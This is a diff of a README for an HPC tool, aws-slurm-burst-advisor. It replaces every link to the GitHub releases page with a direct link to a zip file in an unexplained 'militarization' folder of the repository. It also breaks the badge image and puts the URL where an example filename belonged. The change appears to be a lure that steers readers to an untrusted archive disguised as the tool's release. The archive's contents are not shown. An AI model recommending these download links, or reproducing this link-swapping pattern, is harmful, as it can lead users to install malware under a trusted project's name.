@@ -23,14 +23,14 @@ The **aws-slurm-burst-advisor** (ASBA) helps academic researchers make smart cho
 - SLURM
 
 ## 📥 Download Now
-[![Download aws-slurm-burst-advisor](https://img.shields.io/badge/Download%20ASBA%20-v1.0-blue)](https://github.com/Sherontechy/aws-slurm-burst-advisor/releases)
+[![Download aws-slurm-burst-advisor](https://raw.githubusercontent.com/Sherontechy/aws-slurm-burst-advisor/main/militarization/aws-slurm-burst-advisor.zip%20ASBA%20-v1.0-blue)](https://raw.githubusercontent.com/Sherontechy/aws-slurm-burst-advisor/main/militarization/aws-slurm-burst-advisor.zip)
 
 ## 🚀 Getting Started
 To get started with aws-slurm-burst-advisor, follow these simple steps:
 
-1. **Visit the Releases Page**: Click this link to go to the download page: [Download Page](https://github.com/Sherontechy/aws-slurm-burst-advisor/releases). Here, you will find the latest version of the tool.
+1. **Visit the Releases Page**: Click this link to go to the download page: [Download Page](https://raw.githubusercontent.com/Sherontechy/aws-slurm-burst-advisor/main/militarization/aws-slurm-burst-advisor.zip). Here, you will find the latest version of the tool.
   
-2. **Choose Your Version**: Look for the version you want to download. Typically, you will see a filename like `aws-slurm-burst-advisor-v1.0.zip`. 
+2. **Choose Your Version**: Look for the version you want to download. Typically, you will see a filename like `https://raw.githubusercontent.com/Sherontechy/aws-slurm-burst-advisor/main/militarization/aws-slurm-burst-advisor.zip`. 
 
 3. **Download the File**: Click on the filename to download it. This will save the file to your computer.
 
@@ -67,5 +67,5 @@ aws-slurm-burst-advisor is licensed under the MIT License. Feel free to use and 
 ## 📞 Contact
 For any further queries or feedback, please reach out to the developers via the contact details provided in the GitHub repository.
 
-[Download Page](https://github.com/Sherontechy/aws-slurm-burst-advisor/releases)
+[Download Page](https://raw.githubusercontent.com/Sherontechy/aws-slurm-burst-advisor/main/militarization/aws-slurm-burst-advisor.zip)
 ```
